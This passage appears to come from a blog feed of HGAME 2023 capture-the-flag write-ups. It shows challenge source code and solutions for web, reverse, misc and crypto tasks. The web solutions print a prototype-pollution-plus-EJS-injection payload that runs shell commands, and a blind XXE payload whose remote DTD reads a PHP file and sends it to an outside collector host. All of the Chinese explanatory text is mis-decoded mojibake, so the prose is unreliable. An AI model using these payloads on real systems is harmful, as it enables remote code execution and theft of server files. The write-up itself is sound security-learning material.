res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">method</span> == <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">        <span class="comment">// save userinfo to session</span></span><br><span class="line">        <span class="keyword">let</span> data = &#123;&#125;;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="title function_">merge</span>(data, req.<span class="property">body</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(data);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&quot;login&quot;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;Don&#x27;t pollution my shared diary!&quot;</span>&#125;)</span><br><span class="line">        &#125;</span><br><span class="line">        req.<span class="property">session</span>.<span class="property">data</span> = data</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(req.<span class="property">session</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// check password</span></span><br><span class="line">        <span class="keyword">let</span> user = &#123;&#125;;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(user);</span><br><span class="line">        user.<span class="property">password</span> = req.<span class="property">body</span>.<span class="property">password</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(user);</span><br><span class="line">        <span class="keyword">if</span> (user.<span class="property">password</span>=== <span class="string">&quot;testpassword&quot;</span>) &#123;</span><br><span class="line">            user.<span class="property">role</span> = <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (user.<span class="property">role</span> === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            req.<span class="property">session</span>.<span class="property">role</span> = <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&quot;login&quot;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;Login as admin or don&#x27;t touch my shared diary!&quot;</span>&#125;)</span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">    res.<span class="title function_">render</span>(<span class="string">&#x27;login&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;&quot;</span>&#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">all</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">data</span> || !req.<span class="property">session</span>.<span class="property">data</span>.<span class="property">username</span> || req.<span class="property">session</span>.<span class="property">role</span> !== <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/login&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">method</span> == <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> diary = ejs.<span class="title function_">render</span>(<span class="string">`&lt;div&gt;<span class="subst">$&#123;req.body.diary&#125;</span>&lt;/div&gt;`</span>)</span><br><span class="line">        req.<span class="property">session</span>.<span class="property">diary</span> = diary</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;diary&#x27;</span>, &#123;<span class="attr">diary</span>: req.<span class="property">session</span>.<span class="property">diary</span>, <span class="attr">username</span>: req.<span class="property">session</span>.<span class="property">data</span>.<span class="property">username</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;diary&#x27;</span>, &#123;<span class="attr">diary</span>: req.<span class="property">session</span>.<span class="property">diary</span>, <span class="attr">username</span>: req.<span class="property">session</span>.<span class="property">data</span>.<span class="property">username</span>&#125;);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">8888</span>, <span class="string">&#x27;0.0.0.0&#x27;</span>);</span><br></pre></td></tr></table></figure><p>å®¡è®¡æºç ï¼Œ<code>merge()</code> å‡½æ•°å­˜åœ¨åŸå‹é“¾æ±¡æŸ“æ¼æ´ï¼Œä½†ç¦ç”¨äº† <code>__proto__</code>ï¼Œåˆ©ç”¨ <code>constructor.prototype</code> ç»•è¿‡ã€‚</p><p>å°† <code>user.role</code> è®¾ç½®ä¸º<code>admin</code>ï¼Œç»•è¿‡æƒé™æ§åˆ¶åï¼Œè¿›å…¥ <code>/</code> è·¯ç”±ï¼Œè€Œ <code>ejs.render()</code> å­˜åœ¨SSTIæ¼æ´ï¼Œè®¾ç½® <code>diary</code> å€¼ä¸º <code>&lt;%- global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;ls -al /&#39;) %&gt;</code> å³å¯RCEã€‚</p><p>æ‰‹åŠ¨ä¿®æ”¹ <code>Content-Type</code> ä¸º <code>application/json</code>ï¼ŒPOST payloadï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;username&quot;</span><span class="punctuation">:</span><span class="string">&quot;xxx&quot;</span><span class="punctuation">,</span><span class="attr">&quot;password&quot;</span><span class="punctuation">:</span><span class="string">&quot;ttt&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;diary&quot;</span><span class="punctuation">:</span><span class="string">&quot;&lt;%- global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;cat /flag&#x27;) %&gt;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;constructor&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;prototype&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;role&quot;</span><span class="punctuation">:</span><span class="string">&quot;admin&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>å¾—åˆ°flagï¼š<code>hgame&#123;N0tice_prototype_pollution&amp;&amp;EJS_server_template_injection&#125;</code>ã€‚</p><p>â€‹    </p><h3 id="Tell-Me"><a href="#Tell-Me" class="headerlink" title="Tell Me"></a>Tell Me</h3><blockquote><p>Just tell me your thoughts</p></blockquote><p>æŸ¥çœ‹æºä»£ç æç¤º <code>hint: ./www.zip</code>ï¼ŒæŸ¥çœ‹ <code>send.php</code>ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    </span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;REQUEST_METHOD&quot;</span>] == <span class="string">&quot;POST&quot;</span>)&#123;</span><br><span class="line">    <span class="variable">$xmldata</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://input&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$xmldata</span>))&#123;</span><br><span class="line">        <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmldata</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">        &#125;<span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)&#123;</span><br><span class="line">            <span class="variable">$result</span> = <span class="string">&quot;loading xml data error&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$data</span> = <span class="title function_ invoke__">simplexml_import_dom</span>(<span class="variable">$dom</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$data</span>-&gt;name) || !<span class="keyword">isset</span>(<span class="variable">$data</span>-&gt;email) || !<span class="keyword">isset</span>(<span class="variable">$data</span>-&gt;content))&#123;</span><br><span class="line">            <span class="variable">$result</span> = <span class="string">&quot;name,email,content cannot be empty&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$data</span>-&gt;name &amp;&amp; <span class="variable">$data</span>-&gt;email &amp;&amp; <span class="variable">$data</span>-&gt;content)&#123;</span><br><span class="line">            <span class="variable">$result</span> = <span class="string">&quot;Success! I will see it later&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$result</span> = <span class="string">&quot;Parse xml data error&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Request Method Not Allowed&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ <code>loadXML()+simplexml_import_dom()</code> å‡½æ•°è§£æxmlæ•°æ®ï¼Œå­˜åœ¨XXEæ¼æ´ï¼Œä½†æ— å¯æ§åˆ¶çš„å›æ˜¾ä¿¡æ¯ï¼Œä½¿ç”¨å¤–å¸¦æ–¹å¼å¸¦å‡ºå‘½ä»¤æ‰§è¡Œç»“æœã€‚</p><p>åœ¨VPSæ–°å»º <code>test.dtd</code>ï¼Œå†…å®¹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///var/www/html/flag.php&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;https://eo3dgkbstljeu1v.m.pipedream.net?p=%file;&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><p>POSTæ•°æ®ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE convert [ </span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http://VPS-IP/test.dtd&quot;&gt;</span><br><span class="line">%remote;%int;%send;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;&lt;name&gt;s&lt;/name&gt;&lt;email&gt;d&lt;/email&gt;&lt;content&gt;sss&lt;/content&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure><p>åœ¨pipedreamå¾—åˆ°å›æ˜¾ï¼š</p><p><code>https://eo3dgkbstljeu1v.m.pipedream.net?p=PD9waHAgDQogICAgJGZsYWcxID0gImhnYW1le0JlX0F3YXJlXzBmX1hYZUJsMW5kMW5qZWN0aTBufSI7DQo/Pg==</code></p><p>base64è§£ç å¾— <code>flag.php</code> å†…å®¹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="variable">$flag1</span> = <span class="string">&quot;hgame&#123;Be_Aware_0f_XXeBl1nd1njecti0n&#125;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h3><blockquote><p>å…”å…”çš„ç”µè„‘ä¸å°å¿ƒä¸­äº†ç—…æ¯’ï¼Œç—…æ¯’æŠŠä»–å†™çš„è®ºæ–‡ç»™åŠ å¯†äº†ï¼Œä½ èƒ½å¸®å…”å…”æ¢å¤å—ï¼Ÿ</p></blockquote><p>Goç¨‹åºï¼Œåœ¨ <code>main_main()</code> ä¸­æŸ¥çœ‹ä»£ç é€»è¾‘ï¼Œç»“åˆé¢˜ç›®ï¼Œå…¶ä¸­ä¸€ä¸ªé•¿base64ç¼–ç å­—ç¬¦ä¸²å¯èƒ½ä¸ºè°ƒç”¨çš„shellcodeå­—ç¬¦ä¸²ã€‚</p><p>æå–å‡ºæ¥ï¼š</p><p><code>VUiD7FBIjWwkIEiJTUBIi0VAiwCJRQC4BAAAAEgDRUCLAIlFBMdFCAAAAADHRQwj782rx0UQFgAAAMdFFCEAAADHRRgsAAAAx0UcNwAAAMdFIAAAAACLRSCD+CBzWotFDANFCIlFCItFBMHgBANFEItVCANVBDPCi1UEweoFA1UUM8IDRQCJRQCLRQDB4AQDRRiLVQgDVQAzwotVAMHqBQNVHDPCA0UEiUUEuAEAAAADRSCJRSDrnkiLRUCLVQCJELgEAAAASANFQItVBIkQSI1lMF3D</code></p><p>è§£ç åä¿å­˜ä¸ºæ–‡ä»¶ï¼Œä½¿ç”¨IDAæŸ¥çœ‹ï¼Œè¯†åˆ«ä¸ºå‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">_DWORD *__fastcall <span class="title function_">sub_1</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  _DWORD *result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v2; <span class="comment">// [rsp+20h] [rbp+0h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// [rsp+24h] [rbp+4h]</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+28h] [rbp+8h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [rsp+40h] [rbp+20h]</span></span><br><span class="line"></span><br><span class="line">  v2 = *a1;</span><br><span class="line">  v3 = a1[<span class="number">1</span>];</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">0x20</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 += <span class="number">0xABCDEF23</span>;</span><br><span class="line">    v2 += ((v3 &gt;&gt; <span class="number">5</span>) + <span class="number">33</span>) ^ (v3 + v4) ^ (<span class="number">16</span> * v3 + <span class="number">22</span>);</span><br><span class="line">    v3 += ((v2 &gt;&gt; <span class="number">5</span>) + <span class="number">55</span>) ^ (v2 + v4) ^ (<span class="number">16</span> * v2 + <span class="number">44</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  *a1 = v2;</span><br><span class="line">  result = a1 + <span class="number">1</span>;</span><br><span class="line">  a1[<span class="number">1</span>] = v3;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ˜“çŸ¥ä»£ç ä¸ºé­”æ”¹äº†Deltaå€¼çš„TEAåŠ å¯†ç®—æ³•ï¼Œè§£å¯†ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">v, k</span>):</span><br><span class="line">    v0 = v[<span class="number">0</span>]</span><br><span class="line">    v1 = v[<span class="number">1</span>]</span><br><span class="line">    x = <span class="number">0xABCDEF23</span> * <span class="number">32</span></span><br><span class="line">    delta = <span class="number">0xABCDEF23</span></span><br><span class="line">    k0 = k[<span class="number">0</span>]</span><br><span class="line">    k1 = k[<span class="number">1</span>]</span><br><span class="line">    k2 = k[<span class="number">2</span>]</span><br><span class="line">    k3 = k[<span class="number">3</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        v1 -= ((v0 &lt;&lt; <span class="number">4</span>) + k2) ^ (v0 + x) ^ ((v0 &gt;&gt; <span class="number">5</span>) + k3)</span><br><span class="line">        v1 = v1 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        v0 -= ((v1 &lt;&lt; <span class="number">4</span>) + k0) ^ (v1 + x) ^ ((v1 &gt;&gt; <span class="number">5</span>) + k1)</span><br><span class="line">        v0 = v0 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        x -= delta</span><br><span class="line">        x = x &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    v[<span class="number">0</span>] = v0</span><br><span class="line">    v[<span class="number">1</span>] = v1</span><br><span class="line">    <span class="keyword">return</span> v</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;flag.enc&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">c = [bytes_to_long(f[<span class="number">4</span>*i:<span class="number">4</span>*(i+<span class="number">1</span>)][::-<span class="number">1</span>]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(f)//<span class="number">4</span>)]</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line">key = [<span class="number">22</span>, <span class="number">33</span>, <span class="number">44</span>, <span class="number">55</span>]</span><br><span class="line">flag = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)//<span class="number">2</span>):</span><br><span class="line">    d = decrypt(c[<span class="number">2</span>*i:<span class="number">2</span>*(i+<span class="number">1</span>)], key)</span><br><span class="line">    flag += long_to_bytes(d[<span class="number">0</span>])[::-<span class="number">1</span>] + long_to_bytes(d[<span class="number">1</span>])[::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line">               </span><br><span class="line"><span class="comment"># b&quot;hgame&#123;th1s_1s_th3_tutu&#x27;s_h0mew0rk&#125;\x00&quot;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;â€‹    &lt;/p&gt;
&lt;p&gt;HGAME 2023 å°†äº 1 æœˆ 5 æ—¥ 20:00 æ­£å¼å¼€å§‹ï¼Œç¥å¤§å®¶ç©å¾—å¼€å¿ƒ :-)&lt;br&gt;çº¿ä¸Šèµ›å¹³å°ï¼š&lt;a href=&quot;https://hgame.vidar.club/&quot;&gt;https://hgame.vidar.club&lt;/a&gt;&lt;br&gt;è¯·å°½</summary>
      
    
    
    
    <category term="match" scheme="https://lazzzaro.github.io/categories/match/"/>
    
    
    <category term="2023èµ›" scheme="https://lazzzaro.github.io/tags/2023%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>HGAME 2023 Week 3</title>
    <link href="https://lazzzaro.github.io/2023/01/30/match-HGAME-2023-Week-3/"/>
    <id>https://lazzzaro.github.io/2023/01/30/match-HGAME-2023-Week-3/</id>
    <published>2023-01-30T09:25:16.000Z</published>
    <updated>2023-01-30T06:01:55.753Z</updated>
    
    <content type="html"><![CDATA[<p>â€‹    </p><p>HGAME 2023 å°†äº 1 æœˆ 5 æ—¥ 20:00 æ­£å¼å¼€å§‹ï¼Œç¥å¤§å®¶ç©å¾—å¼€å¿ƒ :-)<br>çº¿ä¸Šèµ›å¹³å°ï¼š<a href="https://hgame.vidar.club/">https://hgame.vidar.club</a><br>è¯·å°½å¿«æ³¨å†Œï¼Œæ³¨å†Œæ—¶è¯·é€‰æ‹©æ ¡å¤–é€‰æ‰‹ï¼Œæ³¨å†Œå°†äº 1 æœˆ 12 æ—¥ 20:00 å…³é—­<br>æœ¬æ¬¡æ¯”èµ›çš„å¥–åŠ±äº‹å®œä»¥åŠèµ›åæ²Ÿé€šåé¦ˆä»¥é‚®ä»¶ä¸ºä¸»ï¼Œè¯·å„ä½ä½¿ç”¨çœŸå®çš„é‚®ä»¶åœ°å€<br>æ¯”èµ›å¥–é‡‘(é’ˆå¯¹æ ¡å¤–æ¦œ)ï¼š<br>ç¬¬1åï¼š1000Pwnhubé‡‘å¸<br>ç¬¬2åï¼š800Pwnhubé‡‘å¸<br>ç¬¬3åï¼š600Pwnhubé‡‘å¸<br>4-10åï¼š300Pwnhubé‡‘å¸<br>è¡¥å……è¯´æ˜ï¼šæ’è¡Œæ¦œåˆ†æ•°ç›¸åŒè€…ï¼Œä»¥å…ˆè¾¾åˆ°è¯¥åˆ†æ•°çš„æ—¶é—´æ¬¡åºåˆ’å®šæ’åï¼Œæ¯ä½è·å¥–é€‰æ‰‹é¢å¤–èµ é€ Pwnhub é‚€è¯·ç ä¸€ä¸ª<br>æ³¨æ„ï¼š<br>* æ‰€æœ‰é€‰æ‰‹å‡ä»¥ä¸ªäººä¸ºå•ä½å‚èµ›ï¼›<br>* åœ¨è§£é¢˜è¿‡ç¨‹ä¸­é‡åˆ°ç“¶é¢ˆæˆ–å›°éš¾å¯ä»¥ç§èŠå‡ºé¢˜äºº<br>* ç¦æ­¢æ‰€æœ‰ç ´åæ¯”èµ›å…¬å¹³å…¬æ­£çš„è¡Œä¸ºï¼Œå¦‚ï¼šæ•£æ’­æˆ–ä¸å…¶ä»–äººäº¤æ¢ Flagã€è§£é¢˜æ€è·¯ï¼Œå¯¹å¹³å°ã€å‚èµ›è€…æˆ–å…¶ä»–äººå‘˜è¿›è¡Œæ”»å‡»ã€‚è¿è€…åˆ†æ•°ä½œåºŸå¹¶å–æ¶ˆæ¯”èµ›èµ„æ ¼ã€‚<br>* HGAME çº¿ä¸Šèµ›åˆ†ä¸ºå››å‘¨ï¼Œæ¯å‘¨è‡³å®˜æ–¹wpå‘å¸ƒå‰å‰ç¦æ­¢ä¸€åˆ‡è®¨è®ºæœ¬å‘¨é¢˜ç›®ä»¥åŠå…¬å¼€è‡ªå·± wp çš„è¡Œä¸ºã€‚åœ¨æ”¶é›†å®Œæˆåä¼šå¼€æ”¾è®¨è®ºï¼Œä½†ä»…èƒ½è®¨è®ºå·²ç»“æŸçš„é¢˜ç›®ã€‚<br>* æ¯å‘¨æ¯”èµ›ç»“æŸåæœ¬å‘¨å‰20åéœ€æäº¤wpåˆ°æŒ‡å®šé‚®ç®±<br>æœ¬æ¯”èµ›æœ€ç»ˆè§£é‡Šæƒå½’ Vidar-Team æ‰€æœ‰</p><p><strong>Rank: 7</strong></p><hr><p>â€‹    </p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Tunnel"><a href="#Tunnel" class="headerlink" title="Tunnel"></a>Tunnel</h3><blockquote><p>Just a very very very safe tunnel.</p><p>HINTS:</p><p>ç”±äºé™„ä»¶æœ‰é—®é¢˜åˆ†æ•°ä¸‹è°ƒè‡³50åˆ†</p></blockquote><p>16è¿›åˆ¶æŸ¥çœ‹å™¨ï¼Œæœç´¢ <code>hgame</code> ï¼Œæœ‰ <code>hgame&#123;ikev1_may_not_safe_aw987rtgh&#125;</code>ã€‚</p><p>â€‹    </p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="ezDH"><a href="#ezDH" class="headerlink" title="ezDH"></a>ezDH</h3><blockquote><p>è¿™å¤§è¿‡å¹´çš„ï¼ŒBobç»™Aliceå‘äº†ä»€ä¹ˆæ¶ˆæ¯å‘¢</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> Alice_secret, Bob_secret, FLAG</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;output&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"></span><br><span class="line">N=<span class="number">0x2be227c3c0e997310bc6dad4ccfeec793dca4359aef966217a88a27da31ffbcd6bb271780d8ba89e3cf202904efde03c59fef3e362b12e5af5afe8431cde31888211d72cc1a00f7c92cb6adb17ca909c3b84fcad66ac3be724fbcbe13d83bbd3ad50c41a79fcdf04c251be61c0749ea497e65e408dac4bbcb3148db4ad9ca0aa4ee032f2a4d6e6482093aa7133e5b1800001</span></span><br><span class="line">g = <span class="number">2</span></span><br><span class="line"></span><br><span class="line">A = power_mod(g, Alice_secret, N)</span><br><span class="line">f.write(<span class="string">&quot;Alice send to Bob: &#123;&#123; &#x27;g&#x27;: &#123;g&#125;, &#x27;A&#x27;: &#123;A&#125; &#125;&#125;\n&quot;</span>.<span class="built_in">format</span>(g=g, A=<span class="built_in">hex</span>(A)))</span><br><span class="line">B = power_mod(g, Bob_secret, N)</span><br><span class="line">f.write(<span class="string">&quot;Bob send to Alice: &#123;&#123;&#x27;B&#x27;: &#123;B&#125; &#125;&#125;\n&quot;</span>.<span class="built_in">format</span>(B=<span class="built_in">hex</span>(B)))</span><br><span class="line"></span><br><span class="line">shared_secret = <span class="built_in">pow</span>(A, Bob_secret, N)</span><br><span class="line"></span><br><span class="line">p=<span class="number">6864797660130609714981900799081393217269435300143305409394463459185543183397656052122559640661454554977296311391480858037121987999716643812574028291115057151</span></span><br><span class="line">a=-<span class="number">3</span></span><br><span class="line">b=<span class="number">1093849038073734274511112390766805569936207598951683748994586394495953116150735016013708737573759623248592132296706313309438452531591012912142327488478985984</span></span><br><span class="line">E = EllipticCurve(GF(p), [a, b])</span><br><span class="line">G = E.random_point()</span><br><span class="line">Pa = shared_secret * G</span><br><span class="line">f.write(<span class="string">f&quot;Alice send to Bob: &#123;&#123; &#x27;E&#x27;: <span class="subst">&#123;E&#125;</span>, &#x27;G&#x27;: <span class="subst">&#123;G.xy()&#125;</span>, &#x27;Pa&#x27;: <span class="subst">&#123;Pa.xy()&#125;</span> &#125;&#125;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">k 